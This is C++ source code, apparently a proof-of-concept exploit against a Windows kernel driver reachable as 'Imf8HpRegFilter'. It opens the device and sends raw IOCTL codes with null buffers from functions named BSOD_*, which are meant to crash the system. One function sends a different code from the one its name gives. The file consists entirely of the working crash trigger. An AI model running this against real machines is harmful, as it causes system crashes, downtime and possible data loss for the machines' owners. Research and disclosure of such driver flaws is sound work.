#include <iostream>
#include <Windows.h>
#include <winioctl.h>

#define SymLinkName L"\\\\.\\Imf8HpRegFilter"

HANDLE hDevice;

void BSOD_8001E000()
{
    DWORD dwWrite;
    DeviceIoControl(hDevice, 0x8001E000, NULL, 0, NULL, 0, &dwWrite, NULL);
}

void BSOD_8001E004()
{
    DWORD dwWrite;
    DeviceIoControl(hDevice, 0x8001E004, NULL, 0, NULL, 0, &dwWrite, NULL);
}

void BSOD_8001E018()
{
    DWORD dwWrite;
    DeviceIoControl(hDevice, 0x8001E018, NULL, 0, NULL, 0, &dwWrite, NULL);
}

void BSOD_8001E01C()
{
    DWORD dwWrite;
    DeviceIoControl(hDevice, 0x8001E018, NULL, 0, NULL, 0, &dwWrite, NULL);
}

void BSOD_8001E024()
{
    DWORD dwWrite;
    DeviceIoControl(hDevice, 0x8001E024, NULL, 0, NULL, 0, &dwWrite, NULL);
}

void BSOD_8001E040()
{
    DWORD dwWrite;
    DeviceIoControl(hDevice, 0x8001E040, NULL, 0, NULL, 0, &dwWrite, NULL);
}

int main(int argc, char* argv[])
{
    hDevice = CreateFile(SymLinkName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);
    if (hDevice == INVALID_HANDLE_VALUE)
    {
        printf("Get Driver Handle Error with Win32 error code: %x\n", GetLastError());
        system("pause");
        return 0;
    }

    BSOD_8001E01C();

    system("pause");
    return 0;
}
